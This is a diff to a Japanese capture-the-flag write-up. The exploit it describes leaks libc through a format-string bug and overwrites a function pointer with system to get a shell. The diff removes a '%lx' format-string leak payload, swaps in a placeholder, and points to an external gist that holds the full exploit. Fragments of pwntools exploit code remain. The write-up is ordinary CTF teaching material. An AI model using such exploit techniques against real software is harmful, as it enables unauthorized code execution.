@@ -74,6 +74,11 @@ win関数は与えられていないためlibc leakをしなければシェル�
 
 libc leakからsystemのアドレスを関数ポインタに入れ,`g_messages`に`/bin/sh\0`を入れてから関数ポインタを呼び出しシェルを取りました :happy:
 
+Writersideがエラーを出力するのでfsbペイロードを記事のexploitから削除しました.
+完全なexploitはgistから入手してください.
+
+[](https://gist.github.com/Yayoi-cs/94d97f8c1dca4f68177f6b0ec34620c0)
+
 ```py
 from pwn import *
 import sys
@@ -124,7 +129,13 @@ sl(b"1")
 print(ru(b"Index: "))
 sl(str(0).encode())
 print(ru(b"Message: "))
-sl("%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx")
+
+"""
+EDIT HERERERERERE
+https://gist.github.com/Yayoi-cs/94d97f8c1dca4f68177f6b0ec34620c0
+EDIT HERERERERERE
+EDIT HERERERERERE
+"""
 
 print(ru(b"> "))
 sl(b"1")
